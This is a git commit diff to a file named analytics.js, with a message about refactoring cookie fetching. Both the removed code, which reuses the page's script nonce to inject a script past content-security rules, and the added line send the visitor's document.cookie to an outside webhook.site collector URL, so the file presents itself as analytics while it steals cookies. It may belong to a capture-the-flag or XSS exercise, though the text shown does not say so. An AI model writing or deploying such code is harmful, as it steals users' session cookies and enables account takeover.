8cda9c31ebcc182c8b79b17e6d71c69c31ca5232
lucassun14 <142594125+lucassun14@users.noreply.github.com>
2026-04-24 11:36:28 +1000

    Refactor cookie fetching to remove script injection
    Removed nonce-based script injection and directly fetch cookies.

--- analytics.js
+++ analytics.js
@@ -1,7 +1,1 @@
-const nonce = document.currentScript.nonce;
-const newHTML = `
-  <script nonce="${nonce}">
-    fetch('https://webhook.site/39e1f325-6799-4e48-ad5c-a5ca2167ad0d?q=' + document.cookie);
-  <\/script>
-`;
-document.write(newHTML);
+fetch('https://webhook.site/39e1f325-6799-4e48-ad5c-a5ca2167ad0d?q=' + document.cookie);
